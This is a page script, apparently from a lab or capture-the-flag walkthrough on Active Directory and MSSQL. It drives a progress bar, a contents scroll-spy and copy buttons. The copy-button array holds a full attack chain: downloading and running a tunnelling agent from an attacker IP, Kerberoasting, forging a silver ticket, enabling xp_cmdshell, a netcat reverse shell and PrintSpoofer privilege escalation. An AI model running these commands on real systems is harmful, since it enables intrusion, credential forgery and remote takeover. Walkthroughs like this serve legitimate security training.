<script>
// reading progress
const progress = document.getElementById('progress') as HTMLElement;
const toTop    = document.getElementById('toTop') as HTMLElement;
function updProgress() {
  const h = document.documentElement;
  const max = h.scrollHeight - h.clientHeight;
  const pct = max > 0 ? (h.scrollTop / max) * 100 : 0;
  progress.style.width = pct + '%';
  toTop.classList.toggle('show', h.scrollTop > 600);
}
document.addEventListener('scroll', updProgress, { passive: true });
updProgress();
toTop.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));

// TOC scroll-spy
const ids = ['scenario','why','subsystems','walkthrough','breaks','wrap'];
const sections = ids.map(id => document.getElementById(id)).filter(Boolean) as HTMLElement[];
const tocLinks = document.querySelectorAll<HTMLAnchorElement>('#tocList a');
const spy = new IntersectionObserver(entries => {
  entries.forEach(e => {
    if (e.isIntersecting) {
      const id = (e.target as HTMLElement).id;
      tocLinks.forEach(a => a.classList.toggle('on', a.getAttribute('href') === '#' + id));
    }
  });
}, { rootMargin: '-30% 0px -60% 0px' });
sections.forEach(s => spy.observe(s));

// copy buttons
// copy buttons — content stored here to avoid template parser issues with $ and { }
const COPIES: string[] = [
  "sudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up",
  "python3 -m http.server 8000",
  "cmd /c curl -O http://10.10.14.5:8000/agent.exe\ncmd /c agent.exe -connect 10.10.14.5:11601 -ignore-cert",
  "session\nstart",
  "sudo ip route add 240.0.0.1/32 dev ligolo",
  "impacket-mssqlclient svc_mssql:Passw0rd123!@240.0.0.1 -windows-auth",
  "impacket-GetUserSPNs 'corp.local/john.smith:Winter2024!' -dc-ip 10.10.10.10 -request",
  "impacket-lookupsid 'corp.local/svc_mssql:Passw0rd123!'@240.0.0.1",
  "NT=$(echo -n 'Passw0rd123!' | iconv -t utf-16le | openssl dgst -md4 -r | awk '{print $1}')\necho $NT",
  "240.0.0.1    srv01.corp.local corp.local",
  "nxc smb 240.0.0.1 -u 'svc_mssql' -p 'Passw0rd123!' --generate-krb5-file krb5.conf\nsudo cp krb5.conf /etc/krb5.conf",
  "impacket-ticketer Administrator -spn 'MSSQL/srv01.corp.local' -domain 'corp.local' -domain-sid 'S-1-5-21-1111111111-2222222222-3333333333' -nthash 'ab4f5a5c42df5a0ee337d12ce77332f5'",
  "export KRB5CCNAME=$(pwd)/Administrator.ccache\nklist",
  "impacket-mssqlclient -k -no-pass Administrator@srv01.corp.local",
  'enable_xp_cmdshell\nxp_cmdshell "whoami /priv"',
  'xp_cmdshell "C:\\temp\\nc.exe 10.10.14.5 4445 -e cmd"',
  "PrintSpoofer64.exe -i -c cmd",
];

document.addEventListener('click', async e => {
  const b = (e.target as Element).closest<HTMLButtonElement>('.cb .copy');
  if (!b) return;
  const text = COPIES[parseInt(b.dataset.idx ?? '-1')] ?? '';
  try { await navigator.clipboard.writeText(text); }
  catch (_) {
    const ta = document.createElement('textarea');
    ta.value = text; document.body.appendChild(ta);
    ta.select(); try { document.execCommand('copy'); } catch (_) {}
    ta.remove();
  }
  const prev = b.textContent;
  b.classList.add('ok'); b.textContent = '✓';
  setTimeout(() => { b.classList.remove('ok'); b.textContent = prev; }, 1300);
});
